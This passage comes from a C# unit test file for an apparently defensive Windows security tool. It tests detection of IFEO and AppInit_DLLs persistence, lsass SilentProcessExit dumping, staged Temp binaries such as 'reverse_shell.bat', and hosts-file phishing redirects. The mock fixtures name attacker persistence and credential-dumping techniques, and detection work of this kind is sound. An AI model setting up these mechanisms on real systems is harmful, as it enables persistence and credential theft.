            mockReg.Setup(r => r.GetSubKeyNames(RegistryHive.LocalMachine, RegistryView.Registry32, ifeoKey))
                .Returns(new[] { "calc.exe" });
            mockReg.Setup(r => r.GetString(RegistryHive.LocalMachine, RegistryView.Registry32, $@"{ifeoKey}\calc.exe", "Debugger"))
                .Returns(@"C:\hook32.exe");

            var engine = new PersistenceScannerEngine(
                mockReg.Object,
                new Mock<IWmiSubscriptionService>().Object,
                new Mock<IScheduledTaskService>().Object,
                new Mock<IProcessProvider>().Object,
                new Mock<IFileSystemProvider>().Object,
                new Mock<IDigitalSignatureValidator>().Object);

            var report = await engine.ScanAsync();
            var ifeoThreats = report.Threats.Where(t => t.Category == "IFEO Hijack").ToList();
            Assert.Equal(2, ifeoThreats.Count);
        }

        [Fact]
        public async Task T1_F7_03_IfeoAppInit_ScanAsync_DetectsSilentProcessExitPersistence()
        {
            var mockReg = new Mock<IPersistenceRegistryService>();
            string ifeoKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options";
            string silentKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe";

            mockReg.Setup(r => r.GetSubKeyNames(RegistryHive.LocalMachine, RegistryView.Registry64, ifeoKey)).Returns(new[] { "lsass.exe" });
            mockReg.Setup(r => r.GetDword(RegistryHive.LocalMachine, RegistryView.Registry64, $@"{ifeoKey}\lsass.exe", "GlobalFlag")).Returns(0x200);
            mockReg.Setup(r => r.GetString(RegistryHive.LocalMachine, RegistryView.Registry64, silentKey, "MonitorProcess")).Returns(@"C:\dumper.exe");

            var engine = new PersistenceScannerEngine(
                mockReg.Object,
                new Mock<IWmiSubscriptionService>().Object,
                new Mock<IScheduledTaskService>().Object,
                new Mock<IProcessProvider>().Object,
                new Mock<IFileSystemProvider>().Object,
                new Mock<IDigitalSignatureValidator>().Object);

            var report = await engine.ScanAsync();
            var threat = Assert.Single(report.Threats, t => t.Category == "SilentProcessExit Hijack");
            Assert.Equal(ThreatSeverity.Critical, threat.Severity);
            Assert.Contains(@"C:\dumper.exe", threat.CommandOrValue);
        }

        [Fact]
        public async Task T1_F7_04_IfeoAppInit_ScanAsync_DetectsAppInitDllsInjection()
        {
            var mockReg = new Mock<IPersistenceRegistryService>();
            string winPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows";
            mockReg.Setup(r => r.GetString(RegistryHive.LocalMachine, RegistryView.Registry64, winPath, "AppInit_DLLs")).Returns(@"C:\injected.dll");
            mockReg.Setup(r => r.GetDword(RegistryHive.LocalMachine, RegistryView.Registry64, winPath, "LoadAppInit_DLLs")).Returns(1);

            var engine = new PersistenceScannerEngine(
                mockReg.Object,
                new Mock<IWmiSubscriptionService>().Object,
                new Mock<IScheduledTaskService>().Object,
                new Mock<IProcessProvider>().Object,
                new Mock<IFileSystemProvider>().Object,
                new Mock<IDigitalSignatureValidator>().Object);

            var report = await engine.ScanAsync();
            var threat = Assert.Single(report.Threats, t => t.Category == "DLL Injection");
            Assert.Equal(ThreatSeverity.Critical, threat.Severity);
        }

        [Fact]
        public async Task T1_F7_05_IfeoAppInit_RemediateEntryAsync_RemediatesIfeoAndAppInit()
        {
            var mockReg = new Mock<IPersistenceRegistryService>();
            var engine = new PersistenceScannerEngine(
                mockReg.Object,
                new Mock<IWmiSubscriptionService>().Object,
                new Mock<IScheduledTaskService>().Object,
                new Mock<IProcessProvider>().Object,
                new Mock<IFileSystemProvider>().Object,
                new Mock<IDigitalSignatureValidator>().Object);

            var ifeoThreat = new PersistenceThreatItem
            {
                Id = "ifeo_utilman",
                Category = "IFEO Hijack",
                TargetType = "IFEO",
                AdditionalData = "utilman.exe|Registry64"
            };

            var res = await engine.RemediateEntryAsync(ifeoThreat);
            Assert.True(res.Success);
            mockReg.Verify(r => r.DeleteValue(RegistryHive.LocalMachine, RegistryView.Registry64, @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe", "Debugger"), Times.Once);
            mockReg.Verify(r => r.DeleteValue(RegistryHive.LocalMachine, RegistryView.Registry32, @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe", "Debugger"), Times.Once);
        }

        #endregion

        #region Tier 1 - Feature 8: Unsigned Temp/AppData Process Hunter

        [Fact]
        public async Task T1_F8_01_TempProcessHunter_ScanAsync_DetectsRunningProcessInTemp()
        {
            var mockProcessProvider = new Mock<IProcessProvider>();
            var mockSigValidator = new Mock<IDigitalSignatureValidator>();
            string tempProc = Path.Combine(Path.GetTempPath(), "payload.exe");

            mockProcessProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>
            {
                new() { ProcessId = 4444, ProcessName = "payload", ExecutablePath = tempProc }
            });
            mockSigValidator.Setup(v => v.ValidateSignature(tempProc)).Returns(SignatureValidationResult.Unsigned());

            var engine = new PersistenceScannerEngine(
                new Mock<IPersistenceRegistryService>().Object,
                new Mock<IWmiSubscriptionService>().Object,
                new Mock<IScheduledTaskService>().Object,
                mockProcessProvider.Object,
                new Mock<IFileSystemProvider>().Object,
                mockSigValidator.Object);

            var report = await engine.ScanAsync();
            var threat = Assert.Single(report.Threats, t => t.Category == "Suspicious Running Binary");
            Assert.Equal(ThreatSeverity.Critical, threat.Severity);
            Assert.Contains("payload", threat.Name);
        }

        [Fact]
        public async Task T1_F8_02_TempProcessHunter_ScanAsync_FlagsUnsignedStagedExecutables()
        {
            var mockFileSystem = new Mock<IFileSystemProvider>();
            var mockSigValidator = new Mock<IDigitalSignatureValidator>();
            string exePath = Path.Combine(Path.GetTempPath(), "unsigned.exe");

            mockFileSystem.Setup(f => f.DirectoryExists(It.IsAny<string>())).Returns(true);
            mockFileSystem.Setup(f => f.GetFiles(It.IsAny<string>(), "*.exe", SearchOption.TopDirectoryOnly)).Returns(new[] { exePath });
            mockFileSystem.Setup(f => f.GetFileLength(exePath)).Returns(50000);
            mockSigValidator.Setup(v => v.ValidateSignature(exePath)).Returns(SignatureValidationResult.Unsigned());

            var mockTask = new Mock<IScheduledTaskService>();
            mockTask.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>());
            var mockProc = new Mock<IProcessProvider>();
            mockProc.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());
            var mockWmi = new Mock<IWmiSubscriptionService>();
            mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>());
            mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>());
            mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>());
            var mockReg = new Mock<IPersistenceRegistryService>();
            mockReg.Setup(r => r.GetSubKeyNames(It.IsAny<RegistryHive>(), It.IsAny<RegistryView>(), It.IsAny<string>())).Returns(Array.Empty<string>());

            var engine = new PersistenceScannerEngine(
                mockReg.Object,
                mockWmi.Object,
                mockTask.Object,
                mockProc.Object,
                mockFileSystem.Object,
                mockSigValidator.Object);

            var report = await engine.ScanAsync();
            var threat = Assert.Single(report.Threats, t => t.Category == "Unsigned Staged Binary");
            Assert.Equal(ThreatSeverity.Medium, threat.Severity);
        }

        [Fact]
        public async Task T1_F8_03_TempProcessHunter_ScanAsync_FlagsSelfSignedBinariesWithHighSeverity()
        {
            var mockFileSystem = new Mock<IFileSystemProvider>();
            var mockSigValidator = new Mock<IDigitalSignatureValidator>();
            string exePath = Path.Combine(Path.GetTempPath(), "selfsigned.exe");

            mockFileSystem.Setup(f => f.DirectoryExists(It.IsAny<string>())).Returns(true);
            mockFileSystem.Setup(f => f.GetFiles(It.IsAny<string>(), "*.exe", SearchOption.TopDirectoryOnly)).Returns(new[] { exePath });
            mockFileSystem.Setup(f => f.GetFileLength(exePath)).Returns(25000);
            mockSigValidator.Setup(v => v.ValidateSignature(exePath)).Returns(SignatureValidationResult.Invalid("Self-signed certificate.", selfSigned: true));

            var mockTask = new Mock<IScheduledTaskService>();
            mockTask.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>());
            var mockProc = new Mock<IProcessProvider>();
            mockProc.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());
            var mockWmi = new Mock<IWmiSubscriptionService>();
            mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>());
            mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>());
            mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>());
            var mockReg = new Mock<IPersistenceRegistryService>();
            mockReg.Setup(r => r.GetSubKeyNames(It.IsAny<RegistryHive>(), It.IsAny<RegistryView>(), It.IsAny<string>())).Returns(Array.Empty<string>());

            var engine = new PersistenceScannerEngine(
                mockReg.Object,
                mockWmi.Object,
                mockTask.Object,
                mockProc.Object,
                mockFileSystem.Object,
                mockSigValidator.Object);

            var report = await engine.ScanAsync();
            var threat = Assert.Single(report.Threats, t => t.Category == "Unsigned Staged Binary");
            Assert.Equal(ThreatSeverity.High, threat.Severity);
        }

        [Fact]
        public async Task T1_F8_04_TempProcessHunter_ScanAsync_FlagsStagedScriptPayloads()
        {
            var mockFileSystem = new Mock<IFileSystemProvider>();
            string batPath = Path.Combine(Path.GetTempPath(), "reverse_shell.bat");

            mockFileSystem.Setup(f => f.DirectoryExists(It.IsAny<string>())).Returns(true);
            mockFileSystem.Setup(f => f.GetFiles(It.IsAny<string>(), "*.bat", SearchOption.TopDirectoryOnly)).Returns(new[] { batPath });
            mockFileSystem.Setup(f => f.GetFileLength(batPath)).Returns(1024);

            var mockTask = new Mock<IScheduledTaskService>();
            mockTask.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>());
            var mockProc = new Mock<IProcessProvider>();
            mockProc.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());
            var mockWmi = new Mock<IWmiSubscriptionService>();
            mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>());
            mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>());
            mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>());
            var mockReg = new Mock<IPersistenceRegistryService>();
            mockReg.Setup(r => r.GetSubKeyNames(It.IsAny<RegistryHive>(), It.IsAny<RegistryView>(), It.IsAny<string>())).Returns(Array.Empty<string>());

            var engine = new PersistenceScannerEngine(
                mockReg.Object,
                mockWmi.Object,
                mockTask.Object,
                mockProc.Object,
                mockFileSystem.Object,
                new Mock<IDigitalSignatureValidator>().Object);

            var report = await engine.ScanAsync();
            var threat = Assert.Single(report.Threats, t => t.Category == "Staged Script Payload");
            Assert.Equal(ThreatSeverity.Medium, threat.Severity);
            Assert.Equal("reverse_shell.bat", threat.Name);
        }

        [Fact]
        public async Task T1_F8_05_TempProcessHunter_RemediateEntryAsync_DeletesStagedFile()
        {
            var mockFileSystem = new Mock<IFileSystemProvider>();
            string targetFile = @"C:\Users\Admin\AppData\Local\Temp\dropper.exe";
            mockFileSystem.Setup(f => f.FileExists(targetFile)).Returns(true);

            var engine = new PersistenceScannerEngine(
                new Mock<IPersistenceRegistryService>().Object,
                new Mock<IWmiSubscriptionService>().Object,
                new Mock<IScheduledTaskService>().Object,
                new Mock<IProcessProvider>().Object,
                mockFileSystem.Object,
                new Mock<IDigitalSignatureValidator>().Object);

            var threat = new PersistenceThreatItem
            {
                Id = "file_test",
                Category = "Unsigned Staged Binary",
                Location = targetFile,
                TargetType = "File",
                AdditionalData = targetFile
            };

            var res = await engine.RemediateEntryAsync(threat);
            Assert.True(res.Success);
            mockFileSystem.Verify(f => f.DeleteFile(targetFile), Times.Once);
        }

        #endregion

        #region Tier 1 - Feature 9: Hosts File Parser & Sinkhole Detection

        [Fact]
        public void T1_F9_01_HostsParser_ParseHostsContent_ParsesEntriesWithCorrectLineNumbers()
        {
            string content = @"
# Header comment
127.0.0.1 localhost
192.168.1.1 gateway.local
";
            var entries = DnsHostsGuardEngine.ParseHostsContent(content);
            Assert.Equal(2, entries.Count);
            Assert.Equal("127.0.0.1", entries[0].IpAddress);
            Assert.Equal("localhost", entries[0].Hostname);
            Assert.Equal("192.168.1.1", entries[1].IpAddress);
            Assert.Equal("gateway.local", entries[1].Hostname);
        }

        [Fact]
        public void T1_F9_02_HostsParser_StripsInlineCommentsAndHandlesMultipleHostsPerLine()
        {
            string content = "10.0.0.5 node1.cluster node2.cluster node3.cluster # primary nodes";
            var entries = DnsHostsGuardEngine.ParseHostsContent(content);
            Assert.Equal(3, entries.Count);
            Assert.All(entries, e => Assert.Equal("10.0.0.5", e.IpAddress));
            Assert.Contains(entries, e => e.Hostname == "node1.cluster");
            Assert.Contains(entries, e => e.Hostname == "node2.cluster");
            Assert.Contains(entries, e => e.Hostname == "node3.cluster");
        }

        [Fact]
        public void T1_F9_03_HostsParser_DetectsSecuritySinkhole()
        {
            var entry = new HostsEntry { IpAddress = "0.0.0.0", Hostname = "virustotal.com" };
            var evaluated = DnsHostsGuardEngine.EvaluateHostsEntry(entry);

            Assert.True(evaluated.IsSuspicious);
            Assert.Equal(ThreatSeverity.Critical, evaluated.Severity);
            Assert.Equal(HostsThreatCategory.SecuritySinkhole, evaluated.Category);
            Assert.Contains("sinkholed", evaluated.Reason, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void T1_F9_04_HostsParser_DetectsFinancialPhishingRedirect()
        {
            var entry = new HostsEntry { IpAddress = "198.51.100.25", Hostname = "chase.com" };
            var evaluated = DnsHostsGuardEngine.EvaluateHostsEntry(entry);

            Assert.True(evaluated.IsSuspicious);
            Assert.Equal(ThreatSeverity.Critical, evaluated.Severity);
            Assert.Equal(HostsThreatCategory.FinancialPhishingRedirect, evaluated.Category);
        }

        [Fact]
        public void T1_F9_05_HostsParser_DetectsSearchAdwareHijacks()
        {
            var entry = new HostsEntry { IpAddress = "198.51.100.77", Hostname = "google.com" };
            var evaluated = DnsHostsGuardEngine.EvaluateHostsEntry(entry);

            Assert.True(evaluated.IsSuspicious);
            Assert.Equal(ThreatSeverity.High, evaluated.Severity);
            Assert.Equal(HostsThreatCategory.SearchAdwareHijack, evaluated.Category);
        }

        #endregion

        #region Tier 1 - Feature 10: Atomic Hosts File Restore & Backup

        [Fact]
        public async Task T1_F10_01_HostsRestore_CreatesDualPathBackups()
        {
            var mockFileService = new Mock<IHostsFileService>();
            var mockFlusher = new Mock<IDnsCacheFlusher>();
            mockFileService.Setup(f => f.GetHostsPath()).Returns(@"C:\Windows\System32\drivers\etc\hosts");
            mockFileService.Setup(f => f.FileExists(It.IsAny<string>())).Returns(true);
            mockFileService.Setup(f => f.CreateSystemBackup(It.IsAny<string>())).Returns(@"C:\hosts.bak.sys");
            mockFileService.Setup(f => f.CreateUserAppDataBackup(It.IsAny<string>())).Returns(@"C:\hosts.bak.user");
            mockFlusher.Setup(f => f.FlushResolverCache()).Returns(true);

            var engine = new DnsHostsGuardEngine(mockFileService.Object, new Mock<IDnsAdapterAuditor>().Object, mockFlusher.Object);
            var res = await engine.RestoreDefaultHostsFileAsync();

            Assert.True(res.Success);
            Assert.True(res.SystemBackupCreated);
            Assert.True(res.UserBackupCreated);
            Assert.Equal(@"C:\hosts.bak.sys", res.SystemBackupPath);
            Assert.Equal(@"C:\hosts.bak.user", res.UserBackupPath);
        }

        [Fact]
        public async Task T1_F10_02_HostsRestore_WritesWindows11CleanTemplate()
        {
            var mockFileService = new Mock<IHostsFileService>();
            var mockFlusher = new Mock<IDnsCacheFlusher>();
            mockFileService.Setup(f => f.GetHostsPath()).Returns(@"C:\Windows\System32\drivers\etc\hosts");
            mockFileService.Setup(f => f.FileExists(It.IsAny<string>())).Returns(true);
            mockFlusher.Setup(f => f.FlushResolverCache()).Returns(true);

            var engine = new DnsHostsGuardEngine(mockFileService.Object, new Mock<IDnsAdapterAuditor>().Object, mockFlusher.Object);
            var res = await engine.RestoreDefaultHostsFileAsync();

            Assert.True(res.Success);
            mockFileService.Verify(f => f.WriteAllText(It.IsAny<string>(), It.Is<string>(s => s.Contains("Copyright (c) 1993-2009 Microsoft Corp."))), Times.Once);
        }

        [Fact]
        public async Task T1_F10_03_HostsRestore_NormalizesRestrictiveAttributes()
        {
            var mockFileService = new Mock<IHostsFileService>();
            var mockFlusher = new Mock<IDnsCacheFlusher>();
            mockFileService.Setup(f => f.GetHostsPath()).Returns(@"C:\Windows\System32\drivers\etc\hosts");
            mockFileService.Setup(f => f.FileExists(It.IsAny<string>())).Returns(true);
            mockFileService.Setup(f => f.GetAttributes(It.IsAny<string>())).Returns(FileAttributes.ReadOnly | FileAttributes.System | FileAttributes.Hidden);
            mockFlusher.Setup(f => f.FlushResolverCache()).Returns(true);

            var engine = new DnsHostsGuardEngine(mockFileService.Object, new Mock<IDnsAdapterAuditor>().Object, mockFlusher.Object);
            var res = await engine.RestoreDefaultHostsFileAsync();

            Assert.True(res.Success);
            mockFileService.Verify(f => f.SetAttributes(It.IsAny<string>(), FileAttributes.Normal), Times.AtLeastOnce);
        }

        [Fact]
        public async Task T1_F10_04_HostsRestore_FlushesDnsResolverCache()
        {
            var mockFileService = new Mock<IHostsFileService>();
            var mockFlusher = new Mock<IDnsCacheFlusher>();
            mockFileService.Setup(f => f.GetHostsPath()).Returns(@"C:\Windows\System32\drivers\etc\hosts");
            mockFileService.Setup(f => f.FileExists(It.IsAny<string>())).Returns(true);
            mockFlusher.Setup(f => f.FlushResolverCache()).Returns(true);

            var engine = new DnsHostsGuardEngine(mockFileService.Object, new Mock<IDnsAdapterAuditor>().Object, mockFlusher.Object);
            var res = await engine.RestoreDefaultHostsFileAsync();

            Assert.True(res.Success);
            Assert.True(res.CacheFlushed);
            mockFlusher.Verify(f => f.FlushResolverCache(), Times.Once);
        }

        [Fact]
        public async Task T1_F10_05_HostsRestore_HandlesElevationFailureGracefully()
        {
            var mockFileService = new Mock<IHostsFileService>();
            mockFileService.Setup(f => f.GetHostsPath()).Returns(@"C:\Windows\System32\drivers\etc\hosts");
            mockFileService.Setup(f => f.FileExists(It.IsAny<string>())).Returns(true);
            mockFileService.Setup(f => f.ReplaceFile(It.IsAny<string>(), It.IsAny<string>(), null)).Throws(new UnauthorizedAccessException("Access denied"));

            var engine = new DnsHostsGuardEngine(mockFileService.Object, new Mock<IDnsAdapterAuditor>().Object, new Mock<IDnsCacheFlusher>().Object);
            var res = await engine.RestoreDefaultHostsFileAsync();

            Assert.False(res.Success);
            Assert.True(res.RequiresElevation);
        }

        #endregion

        #region Tier 1 - Feature 11: Multi-Vector DNS Resolver Audit

        [Theory]
        [InlineData("1.1.1.1", "Cloudflare")]
        [InlineData("8.8.8.8", "Google")]
        [InlineData("9.9.9.9", "Quad9")]
        [InlineData("208.67.222.222", "OpenDNS")]
        public void T1_F11_01_DnsResolver_ClassifyDnsServer_RecognizesTrustedPublicDns(string ip, string expectedProvider)
        {
            var c = DnsHostsGuardEngine.ClassifyDnsServer(ip);
            Assert.Equal(DnsServerCategory.TrustedPublic, c.Category);
            Assert.True(c.IsTrusted);
            Assert.Contains(expectedProvider, c.ProviderName);
        }

        [Theory]
        [InlineData("10.0.0.1", DnsServerCategory.PrivateSubnet)]
        [InlineData("172.16.5.1", DnsServerCategory.PrivateSubnet)]
        [InlineData("192.168.1.1", DnsServerCategory.PrivateSubnet)]
        [InlineData("169.254.10.20", DnsServerCategory.PrivateSubnet)]
        [InlineData("127.0.0.1", DnsServerCategory.LocalLoopback)]
        [InlineData("fe80::1", DnsServerCategory.PrivateSubnet)]
        public void T1_F11_02_DnsResolver_ClassifyDnsServer_RecognizesPrivateSubnetsAndLoopbacks(string ip, DnsServerCategory expectedCat)
        {
            var c = DnsHostsGuardEngine.ClassifyDnsServer(ip);
            Assert.Equal(expectedCat, c.Category);
            Assert.True(c.IsTrusted);
        }

        [Theory]
        [InlineData("100.64.0.1", DnsServerCategory.TailscaleCgnat)]
        [InlineData("100.100.100.100", DnsServerCategory.TailscaleCgnat)]
        public void T1_F11_03_DnsResolver_ClassifyDnsServer_RecognizesTailscaleAndCgnat(string ip, DnsServerCategory expectedCat)
        {
            var c = DnsHostsGuardEngine.ClassifyDnsServer(ip);
            Assert.Equal(expectedCat, c.Category);
            Assert.True(c.IsTrusted);
        }

        [Theory]
        [InlineData("198.51.100.55")]
        [InlineData("45.33.32.156")]
        public void T1_F11_04_DnsResolver_ClassifyDnsServer_FlagsRogueUntrustedPublicResolvers(string rogueIp)
        {
            var c = DnsHostsGuardEngine.ClassifyDnsServer(rogueIp);
            Assert.Equal(DnsServerCategory.RogueUntrustedPublic, c.Category);
            Assert.False(c.IsTrusted);
            Assert.Equal(ThreatSeverity.High, c.Severity);
            Assert.NotNull(c.WarningMessage);
        }

        [Fact]
        public async Task T1_F11_05_DnsResolver_AuditDnsResolversAsync_ComputesRogueCountAccurately()
        {
            var mockAuditor = new Mock<IDnsAdapterAuditor>();
            mockAuditor.Setup(a => a.AuditAdaptersAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<AdapterDnsAuditItem>
            {
                new()
                {
                    AdapterName = "Ethernet",
                    DnsServers = new()
                    {
                        DnsHostsGuardEngine.ClassifyDnsServer("1.1.1.1"),
                        DnsHostsGuardEngine.ClassifyDnsServer("198.51.100.99") // Rogue
                    }
                }
            });

            var engine = new DnsHostsGuardEngine(new Mock<IHostsFileService>().Object, mockAuditor.Object, new Mock<IDnsCacheFlusher>().Object);
            var res = await engine.AuditDnsResolversAsync();

            Assert.True(res.HasRogueDns);
            Assert.Equal(1, res.RogueDnsServersCount);
            Assert.Equal(2, res.TotalDnsServersFound);
        }

        #endregion

        #region Tier 1 - Feature 12: CLI `lf sec defender-harden`

        [Fact]
        public void T1_F12_01_CliDefenderHarden_StatusText_OutputsHardeningHeader()
        {
            var ctx = CreateCliContext(isJson: false, isForce: false, isSilent: false, "sec", "defender-harden", "status");
            var (code, stdout, _) = RunSecurityCommand(ctx, "defender-harden");

            Assert.Equal(0, code);
            Assert.Contains("[DEFENDER] Enterprise Hardening Status", stdout);
        }

        [Fact]
        public void T1_F12_02_CliDefenderHarden_StatusJson_OutputsValidJsonWith16AsrRules()
        {
            var ctx = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "defender-harden", "status");
            var (code, stdout, _) = RunSecurityCommand(ctx, "defender-harden");

            Assert.Equal(0, code);
            using var doc = JsonDocument.Parse(stdout);
            var root = doc.RootElement;
            Assert.True(root.TryGetProperty("AsrRules", out var asrProp));
            Assert.Equal(16, asrProp.GetArrayLength());
        }

        [Fact]
        public void T1_F12_03_CliDefenderHarden_EnableAll_OutputsJsonActionPayload()
        {
            var ctx = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "defender-harden", "enable-all");
            var (code, stdout, _) = RunSecurityCommand(ctx, "defender-harden");

            Assert.True(code == 0 || code == 1);
            using var doc = JsonDocument.Parse(stdout);
            Assert.True(doc.RootElement.TryGetProperty("status", out _) || doc.RootElement.TryGetProperty("error", out _));
        }

        [Fact]
        public void T1_F12_04_CliDefenderHarden_Revert_OutputsJsonActionPayload()
        {
            var ctx = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "defender-harden", "revert");
            var (code, stdout, _) = RunSecurityCommand(ctx, "defender-harden");

            Assert.True(code == 0 || code == 1);
            using var doc = JsonDocument.Parse(stdout);
            Assert.True(doc.RootElement.TryGetProperty("status", out _) || doc.RootElement.TryGetProperty("error", out _));
        }

        [Fact]
        public void T1_F12_05_CliDefenderHarden_ScanQuick_OutputsValidJson()
        {
            var ctx = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "defender-harden", "scan-quick");
            var (code, stdout, _) = RunSecurityCommand(ctx, "defender-harden");

            Assert.True(code == 0 || code == 1);
            using var doc = JsonDocument.Parse(stdout);
            Assert.True((doc.RootElement.TryGetProperty("scanType", out var st) && st.GetString() == "Quick")
                || (doc.RootElement.TryGetProperty("details", out var det) && det.TryGetProperty("scanType", out var st2) && st2.GetString() == "Quick"));
        }

        #endregion

        #region Tier 1 - Feature 13: CLI `lf sec persistence-audit`

        [Fact]
        public void T1_F13_01_CliPersistenceAudit_ScanText_OutputsReport()
        {
            var ctx = CreateCliContext(isJson: false, isForce: false, isSilent: false, "sec", "persistence-audit", "scan");
            var (code, stdout, _) = RunSecurityCommand(ctx, "persistence-audit");

            Assert.Equal(0, code);
            Assert.Contains("[PERSISTENCE] Audit complete.", stdout);
        }

        [Fact]
        public void T1_F13_02_CliPersistenceAudit_ScanJson_OutputsValidJsonWithThreatsArray()
        {
            var ctx = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "persistence-audit", "scan");
            var (code, stdout, _) = RunSecurityCommand(ctx, "persistence-audit");

            Assert.Equal(0, code);
            using var doc = JsonDocument.Parse(stdout);
            var root = doc.RootElement;
            Assert.True(root.TryGetProperty("TotalItemsScanned", out _));
            Assert.True(root.TryGetProperty("Threats", out var tProp) && tProp.ValueKind == JsonValueKind.Array);
        }

        [Fact]
        public void T1_F13_03_CliPersistenceAudit_RemediateClean_OutputsCleanStatusWhenNoThreats()
        {
            var ctx = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "persistence-audit", "remediate");
            var (code, stdout, _) = RunSecurityCommand(ctx, "persistence-audit");

            Assert.True(code == 0 || code == 1);
            using var doc = JsonDocument.Parse(stdout);
            Assert.True(doc.RootElement.TryGetProperty("status", out _) || doc.RootElement.TryGetProperty("error", out _));
        }

        [Fact]
        public void T1_F13_04_CliPersistenceAudit_SubcommandAliases_HandledEqually()
        {
            var ctx1 = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "persistence-audit", "clean");
            var ctx2 = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "persistence-audit", "fix");

            var (code1, stdout1, _) = RunSecurityCommand(ctx1, "persistence-audit");
            var (code2, stdout2, _) = RunSecurityCommand(ctx2, "persistence-audit");

            Assert.Equal(code1, code2);
            using var doc1 = JsonDocument.Parse(stdout1);
            using var doc2 = JsonDocument.Parse(stdout2);
            Assert.True(doc1.RootElement.ValueKind == JsonValueKind.Object);
            Assert.True(doc2.RootElement.ValueKind == JsonValueKind.Object);
        }

        [Fact]
        public void T1_F13_05_CliPersistenceAudit_HandlesElevationErrorsGracefully()
        {
            var ctx = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "persistence-audit", "remediate");
            var (code, stdout, _) = RunSecurityCommand(ctx, "persistence-audit");

            Assert.True(code == 0 || code == 1);
            using var doc = JsonDocument.Parse(stdout);
            Assert.True(doc.RootElement.ValueKind == JsonValueKind.Object);
        }

        #endregion

        #region Tier 1 - Feature 14: CLI `lf sec hosts-check`

        [Fact]
        public void T1_F14_01_CliHostsCheck_StatusText_OutputsReport()
        {
            var ctx = CreateCliContext(isJson: false, isForce: false, isSilent: false, "sec", "hosts-check", "status");
            var (code, stdout, _) = RunSecurityCommand(ctx, "hosts-check");

            Assert.Equal(0, code);
            Assert.Contains("[HOSTS] Hosts file contains", stdout);
        }

        [Fact]
        public void T1_F14_02_CliHostsCheck_StatusJson_OutputsPureJsonEnvelope()
        {
            var ctx = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "hosts-check", "status");
            var (code, stdout, _) = RunSecurityCommand(ctx, "hosts-check");

            Assert.Equal(0, code);
            string trimmed = stdout.Trim();
            Assert.StartsWith("{", trimmed);
            Assert.EndsWith("}", trimmed);

            using var doc = JsonDocument.Parse(trimmed);
            var root = doc.RootElement;
            Assert.True(root.TryGetProperty("TotalHostsEntries", out _));
            Assert.True(root.TryGetProperty("SuspiciousEntries", out _));
        }

        [Fact]
        public void T1_F14_03_CliHostsCheck_RestoreDefaultJson_OutputsRestorePayload()
        {
            var ctx = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "hosts-check", "restore-default");
            var (code, stdout, _) = RunSecurityCommand(ctx, "hosts-check");

            Assert.True(code == 0 || code == 1);
            using var doc = JsonDocument.Parse(stdout);
            Assert.True(doc.RootElement.TryGetProperty("status", out _) || doc.RootElement.TryGetProperty("error", out _));
        }

        [Fact]
        public void T1_F14_04_CliHostsCheck_FlagsSuspiciousEntriesInJson()
        {
            var ctx = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "hosts-check", "status");
            var (code, stdout, _) = RunSecurityCommand(ctx, "hosts-check");

            Assert.Equal(0, code);
            using var doc = JsonDocument.Parse(stdout);
            Assert.True(doc.RootElement.TryGetProperty("SuspiciousEntries", out var suspProp));
            Assert.Equal(JsonValueKind.Array, suspProp.ValueKind);
        }

        [Fact]
        public void T1_F14_05_CliHostsCheck_IncludesNetworkAdaptersInJson()
        {
            var ctx = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "hosts-check", "status");
            var (code, stdout, _) = RunSecurityCommand(ctx, "hosts-check");

            Assert.Equal(0, code);
            using var doc = JsonDocument.Parse(stdout);
            Assert.True(doc.RootElement.TryGetProperty("NetworkAdapters", out var netProp));
            Assert.Equal(JsonValueKind.Array, netProp.ValueKind);
        }

        #endregion

        #region Tier 1 - Feature 15: WPF Dashboard Sentinel UI & Telemetry Integration

        [Fact]
        public void T1_F15_01_DashboardSentinel_ComputesActiveRuleScoreAccurately()
        {
            var status = new DefenderHardeningStatus
            {
                IsPuaProtectionEnabled = true,
                IsControlledFolderAccessEnabled = true,
                AsrRules = new List<AsrRuleInfo>
                {
                    new() { Guid = "G1", State = AsrRuleState.Block },
                    new() { Guid = "G2", State = AsrRuleState.Block },
                    new() { Guid = "G3", State = AsrRuleState.Off }
                }
            };

            Assert.Equal(2, status.ActiveAsrRulesCount);
